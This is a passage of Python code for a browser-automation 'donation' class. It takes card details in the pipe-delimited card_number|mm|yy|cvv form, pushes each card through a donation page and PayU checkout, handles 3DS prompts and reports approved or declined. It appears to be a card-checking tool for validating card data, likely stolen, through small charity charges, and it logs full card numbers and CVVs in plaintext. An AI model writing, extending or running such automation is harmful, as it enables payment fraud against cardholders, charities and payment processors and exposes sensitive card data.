        logger.info(f"Starting card processing: {card_details_str}")
        
        try:
            # Parse card details
            success, message = self.parse_card_details(card_details_str)
            if not success:
                if message == "INVALID_EXPIRY":
                    return {"value": "Invalid expiry date.(INVALID_EXPIRY)", "status": "declined"}
                elif message == "CVV must be 3 digits for Visa/Mastercard":
                    return {"value": "CVV must be 3 digits for Visa/Mastercard.(CVV_ERROR)", "status": "declined"}
                elif message == "CARD_NUMBER_ERROR":
                    return {"value": "Please check the card number and try again.(CARD_NUMBER_ERROR)", "status": "declined"}
                else:
                    return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined"}
            
            # Step 1: Process donation and get redirect URL
            redirect_url = self.process_donation()
            if not redirect_url:
                logger.error("Failed to get redirect URL from donation process")
                return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined"}
            
            # Step 2: Follow redirect to PayU (without cookies)
            self.follow_redirect()
            
            # Step 3: Tokenize card
            tokenization_result = self.tokenize_card()
            if not tokenization_result:
                logger.error("Failed to tokenize card")
                return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined"}
            
            # Step 4: Make payment
            payment_result = self.make_payment()
            if not payment_result:
                logger.error("Failed to make payment")
                return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined"}
            
            # Step 5: Check if 3DS verification is required
            if 'continueUrl' in payment_result and payment_result.get('errorCode') is None:
                # Handle 3DS verification
                verification_completed = self.handle_3ds_verification()
                
                # Check if verification timed out (23 seconds)
                if not verification_completed:
                    logger.warning("3DS verification timed out after 23 seconds")
                    return {"value": "Additional 3DS step needed.", "status": "declined"}
                
                # Step 6: Check payment status with retries after 3DS
                status_result = self.check_payment_status()
                if not status_result:
                    return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined"}
                
                # Determine the final status
                final_status = self.determine_status(status_result)
                return final_status
            else:
                # No 3DS required, check payment status directly
                status_result = self.check_payment_status()
                if not status_result:
                    return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined"}
                
                # Determine the final status
                final_status = self.determine_status(status_result)
                return final_status
            
        except Exception as e:
            logger.error(f"An error occurred during the donation process: {str(e)}")
            return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined"}
    
    def cleanup(self):
        """Clean up resources"""
        if self.driver:
            self.driver.quit()
            self.driver = None
            logger.info("Chrome driver cleaned up")

# Main function to be called by the app.py
def process_payment(card_details):
    """
    Process a payment with the given card details.
    
    Args:
        card_details (str): Card details in the format "card_number|mm|yy|cvv"
    
    Returns:
        dict: Result containing the payment status
    """
    # Create a new donation automation instance for each request
    donation = DonationAutomation()
    
    try:
        # Process the card and get the status
        result = donation.process_card(card_details)
        return result
    finally:
        # Clean up resources
        donation.cleanup()
